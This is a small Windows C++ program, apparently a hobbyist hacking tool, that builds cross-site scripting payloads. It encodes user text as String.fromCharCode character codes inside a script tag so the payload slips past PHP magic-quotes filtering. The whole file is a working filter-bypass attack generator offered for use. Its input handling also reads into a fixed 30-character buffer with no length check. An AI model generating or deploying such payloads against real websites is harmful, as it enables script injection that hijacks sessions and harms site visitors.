#include <iostream>
#include <stdio.h>
#include <conio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <windows.h>
#include <mmsystem.h>


using namespace std;

void dow(char *word)
{
    int i = 0, asc, tam = strlen(word);
    do
    {
        asc = (int)word[i];
        i++;
        cout<<asc;
        if(i<tam)
            cout<<',';
    }
    while(i<tam);
}

int main()
{
    char op, word[30];
    system ("title Bypassing MagicQuotes Filters");
    do
    {
        system("cls");
        cout<<" ____ ___ ____ ____ _  _ ___  ____ ____ _  _"<<endl;
        cout<<" ====  |  [__] |--< |\\/| |__> |--| |--< |-:_"<<endl;
        cout<<"          Bypass Magic Quotes T00l\n";
        cout<<"[+]Usage: escribe y da enter xD"<<endl;
        cout<<"_________________________________"<<endl;
        cout<<"\nIntroduce la cadena:"<<endl;
        cout<<"->";
        cin>>word;
        cout<<"\nXSS:"<<endl;
        cout<<"<script>alert(String.fromCharCode(";
        dow(word);
        cout<<"));</script>"<<endl;
        cout<<"\nAgain? s/n"<<endl;
        cout<<"->";
        cin>>op;
        op=tolower(op);
    }
    while(op=='s');
    if (op != 's')
        MessageBox(NULL,TEXT("Coded by StØrMd[4]rk \n\t\nstormdark-nxt@live.jp \n "),TEXT("About"),MB_OK | MB_ICONEXCLAMATION );

    return 0;
}
